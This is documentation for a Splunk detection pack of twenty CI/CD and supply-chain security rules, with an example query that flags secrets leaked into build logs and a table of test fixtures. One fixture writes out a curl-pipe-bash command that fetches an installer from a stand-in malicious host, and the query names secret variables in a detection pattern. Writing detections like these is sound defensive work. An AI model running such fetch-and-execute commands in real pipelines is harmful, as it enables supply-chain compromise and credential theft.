# DevOps / CI-CD Pack

**20 rules — Splunk — supply chain and pipeline security**

The DevOps pack detects supply chain attacks, pipeline manipulation, secret exposure,
and unauthorized access to CI/CD infrastructure.

---

## Pack Summary

| Property | Value |
|---|---|
| Pack Directory | `devops/` |
| ID Range | SP-720001 – SP-720020 |
| Platforms | Splunk |
| Rules | 20 |
| Key Sources | github:audit, gitlab:audit, jenkins:logs |
| MITRE Tactics | Initial Access, Credential Access, Exfiltration |

---

## Rule Inventory

| Rule ID | Name | Severity | Confidence | Technique |
|---|---|---|---|---|
| SP-720001 | CI/CD Pipeline: curl&#124;bash from Untrusted Source | HIGH | 82 | T1195.001 |
| SP-720002 | Workflow File Modified on Protected Branch | CRITICAL | 90 | T1195.002 |
| SP-720003 | GitHub Actions Secret Accessed in Logs | CRITICAL | 95 | T1552.001 |
| SP-720004 | PAT (Personal Access Token) Created | HIGH | 78 | T1528 |
| SP-720005 | Force Push to Main/Master Branch | HIGH | 80 | T1195.002 |
| SP-720006 | Deploy Key Added to Repository | HIGH | 82 | T1098.004 |
| SP-720007 | CI Runner Self-Hosted from External Network | HIGH | 80 | T1195.001 |
| SP-720008 | Dependency Confusion Package Installed | CRITICAL | 90 | T1195.001 |
| SP-720009 | Docker Image Built from Untrusted Base | HIGH | 75 | T1195.002 |
| SP-720010 | Artifact Signing Disabled | HIGH | 82 | T1195.002 |
| SP-720011 | NPM Package with Install Script (postinstall) | HIGH | 78 | T1195.001 |
| SP-720012 | Pipeline Env Variable Printed to Logs | CRITICAL | 92 | T1552.001 |
| SP-720013 | GitHub App Token Exfil Pattern | HIGH | 85 | T1528 |
| SP-720014 | Webhook URL Modified | HIGH | 78 | T1195.002 |
| SP-720015 | CI/CD Build in Non-Standard Container | MEDIUM | 68 | T1204.001 |
| SP-720016 | Merge Queue Bypassed | HIGH | 80 | T1195.002 |
| SP-720017 | Pinned Action Version Changed to Mutable | HIGH | 82 | T1195.001 |
| SP-720018 | OIDC Token Audience Misconfigured | HIGH | 78 | T1552 |
| SP-720019 | Pipeline Approval Step Removed | HIGH | 82 | T1195.002 |
| SP-720020 | Build Cache Poisoning Indicator | CRITICAL | 88 | T1195.001 |

---

## Example: Secret Printed to CI Logs

```splunk-spl
`comment("
SP-720012 | Pipeline Env Variable Printed to Logs
tactic=Credential Access | technique=T1552.001
severity=CRITICAL | confidence=92
platform=splunk | status=stable | version=1.0
")`
index=cicd sourcetype IN ("github:actions:log","gitlab:ci:log","jenkins:build:log")
| where match(_raw, "(?i)(GITHUB_TOKEN|AWS_SECRET|API_KEY|PASSWORD|SECRET)\s*=\s*[A-Za-z0-9+/]{20,}")
| eval rule_id="SP-720012"
| eval tactic="Credential Access", technique="T1552.001"
| eval severity="CRITICAL", confidence=92
| table _time repo workflow job_name _raw rule_id severity confidence
```

---

## Test Fixtures

| Fixture | Type | Scenario |
|---|---|---|
| `tp_cicd_pipeline_curl_bash.json` | TRUE POSITIVE | `curl https://install.evil-packages.io/installer.sh \| bash` in production pipeline |
| `fp_approved_install_script.json` | FALSE POSITIVE | Official NVM install script, version-pinned, on develop branch |
